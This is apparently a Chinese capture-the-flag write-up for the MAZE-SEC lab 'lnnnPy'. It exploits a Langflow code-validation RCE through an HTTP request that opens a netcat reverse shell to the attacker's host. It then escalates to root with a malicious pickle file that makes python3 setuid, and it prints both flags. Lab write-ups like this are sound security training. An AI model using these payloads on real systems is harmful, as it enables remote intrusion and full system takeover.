---
layout: post
title: "[MAZE-SEC]lnnnPy靶机通关记录"
date: 2026-06-21
categories: [MAZE-SEC]
excerpt: "MAZE-SEC社区靶机lnnnPy的通关记录。"
---


```
靶机：lnnnPy
作者：lnnn (QQ: 3467412796)
靶机ID：686
类型：Linux - Baby
```

# User

nmap扫一下，

```bash
~$ nmap -sT -p- -sV 192.168.5.76
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-22 19:44 +0800
Nmap scan report for 192.168.5.76 (192.168.5.76)
Host is up (0.0066s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.0p2 Debian 7+deb13u1 (protocol 2.0)
80/tcp   open  http    nginx
7860/tcp open  http    Uvicorn
MAC Address: E8:B0:C5:A2:6E:21 (Intel Corporate)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.33 seconds
```

这里虽然有80和7860两个web端口，但是进去的内容都是一样的，都是一个叫langflow的东西的面板，进去也也没有验证，点开右上角可以看到版本

![ref1](/assets/images/2026-06-21-lnnnPy-walkthrough/ref1.png)

搜索一下可以发现，1.3.0之前存在一个RCE漏洞，可以利用/api/v1/validate/code这个地址进行RCE，下面是poc

```http
POST /api/v1/validate/code HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json
Content-Length: 125

{"code": "@exec('raise Exception(__import__(\"subprocess\").check_output([\"id\"]))')\ndef foo():\n  pass"}
```

测试一下，存在RCE，因此直接反弹shell

![ref2](/assets/images/2026-06-21-lnnnPy-walkthrough/ref2.png)

```http
POST /api/v1/validate/code HTTP/1.1
Host: 192.168.5.76
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: apikey_tkn_lflw=""; auto_login_lf=auto; sidebar:state=true; access_token_lf=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI0NmU4MDg4OC05M2Q1LTQ4OGYtOGUyYy0xZmZjY2VmNDNlNGMiLCJ0eXBlIjoiYWNjZXNzIiwiZXhwIjoxODEzNjY0OTkyfQ.8IoyvuJu_5LTqSCFgFE2xOI3uLt1QW753RCCItZ7ATc
Connection: keep-alive
Content-Type: application/json
Content-Length: 107

{"code": "@exec('raise Exception(__import__(\"subprocess\").check_output(`[\"busybox\", \"nc\", \"192.168.5.44\", \"4444\", \"-e\", \"/bin/bash\"]`))')\ndef foo():\n  pass"}
```

在/home/lnnn里拿到user flag

```bash
cat user.txt
lnnn{w3lc0me_t0_lnnn_w0rksh0p_y0u_g0t_u53r}
```

# Root

查看一下家目录的其它文件，这应该是个提示，说明有脚本或程序监控/home/lnnn/models/这个文件夹

```bash
cat README.txt 
# lnnn 的个人 AI 工作台
# 本机运行 Langflow AI 工作流平台
# 请勿触碰 /home/lnnn/models/ — 模型评估守护进程正在监控
# 联系方式: lnnn@mazesec.local
```

分析一下服务，发现了lnnn-ai.service和lnnn-eval.service

```bash
$ systemctl list-units --type=service --all
  UNIT                      LOAD      ACTIVE   SUB     DESCRIPTION
  apparmor.service          loaded    inactive dead    Load AppArmor profiles
  apt-daily-upgrade.service loaded    inactive dead    Daily apt upgrade and cl…
  apt-daily.service         loaded    inactive dead    Daily apt download activ…
● auditd.service            not-found inactive dead    auditd.service
● connman.service           not-found inactive dead    connman.service
● console-screen.service    not-found inactive dead    console-screen.service
  console-setup.service     loaded    active   exited  Set console font and key…
  cron.service              loaded    active   running Regular background progr…
  dbus.service              loaded    active   running D-Bus System Message Bus
● display-manager.service   not-found inactive dead    display-manager.service
  ldconfig.service          loaded    inactive dead    Rebuild Dynamic Linker C…
  lm-sensors.service        loaded    active   exited  Initialize hardware moni…
  lnnn-ai.service           loaded    active   running lnnn AI Workflow Platform
  lnnn-eval.service         loaded    inactive dead    lnnn ML Model Evaluation…
```

两个服务都分别看看，

```bash
$ systemctl status lnnn-ai.service
● lnnn-ai.service - lnnn AI Workflow Platform
     Loaded: loaded (/etc/systemd/system/lnnn-ai.service; enabled; preset: enabled)
     Active: active (running) since Mon 2026-06-22 07:27:04 EDT; 47min ago
 Invocation: 59afd6eac98243d691aa7543b86becc5
   Main PID: 398 (langflow)
      Tasks: 16 (limit: 2274)
     Memory: 1.1G (peak: 1.1G)
        CPU: 14.984s
     CGroup: /system.slice/lnnn-ai.service
             ├─398 /opt/langflow-venv/bin/python3 /opt/langflow-venv/bin/langfl…
             ├─485 /opt/langflow-venv/bin/python3 /opt/langflow-venv/bin/langfl…
             ├─796 /bin/bash
             ├─803 python3 -c "import pty; pty.spawn(\"/bin/bash\")"
             ├─804 /bin/bash
             ├─832 /opt/langflow-venv/bin/python3 /opt/langflow-venv/bin/langfl…
             └─876 systemctl status lnnn-ai.service
```

```bash
$ cat /etc/systemd/system/lnnn-ai.service
[Unit]
Description=lnnn AI Workflow Platform
After=network.target

[Service]
Type=simple
User=lnnn
Group=lnnn
WorkingDirectory=/home/lnnn
Environment=HOME=/home/lnnn
Environment=LANGFLOW_DATABASE_URL=sqlite:////home/lnnn/.langflow/langflow.db
ExecStart=/opt/langflow-venv/bin/langflow run --host 0.0.0.0 --port 7860 --no-open-browser
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
```

lnnn-ai.service不是root运行的，所以看看另一个

```
$ cat /etc/systemd/system/lnnn-eval.service
[Unit]
Description=lnnn ML Model Evaluation Service
After=network.target

[Service]
Type=oneshot
ExecStart=/usr/bin/python3 /opt/lnnn-eval/eval_daemon.py
User=root
StandardOutput=append:/var/log/lnnn-eval.log
StandardError=append:/var/log/lnnn-eval.log
```

这个eval_daemon.py比较有意思一点

```python
$ cat /opt/lnnn-eval/eval_daemon.py 
#!/usr/bin/env python3
"""lnnn Model Evaluation Daemon - runs as root, loads ML models from /home/lnnn/models/"""
import os
import glob
import pickle
import logging
import sys

LOG_FILE = '/var/log/lnnn-eval.log'
MODEL_DIR = '/home/lnnn/models'

logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format='%(asctime)s [lnnn-eval] %(levelname)s %(message)s'
)

def load_models():
    pattern = os.path.join(MODEL_DIR, '*.pkl')
    models = glob.glob(pattern)
    if not models:
        logging.info('No models found in %s', MODEL_DIR)
        return
    for path in models:
        try:
            logging.info('Loading model: %s', path)
            with open(path, 'rb') as f:
                model = pickle.load(f)
            logging.info('Model loaded successfully: %s (type=%s)', path, type(model).__name__)
        except Exception as e:
            logging.warning('Failed to load model %s: %s', path, e)

if __name__ == '__main__':
    logging.info("lnnn model eval daemon started (uid=%d)", os.getuid())
    os.chdir("/home/lnnn")
    load_models()
    logging.info('Eval cycle complete')

```

可以看到，这个脚本会把/home/lnnn/models下的.pkl文件，全部调用pickle.load加载，所以就可以构造恶意的pickle文件，进行反序列化提权，恶意脚本

```python
import pickle
import os

class Evil:
    def __reduce__(self):
        return (os.system, ("chmod u+s /usr/bin/python3",))

with open("/home/lnnn/models/evil.pkl", "wb") as f:
    pickle.dump(Evil(), f)
```

提权

```bash
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

root flag

```
lnnn{r00t_0f_lnnn-m4ch1ne_p1ckl3_15_d4ng3r0u5}
```
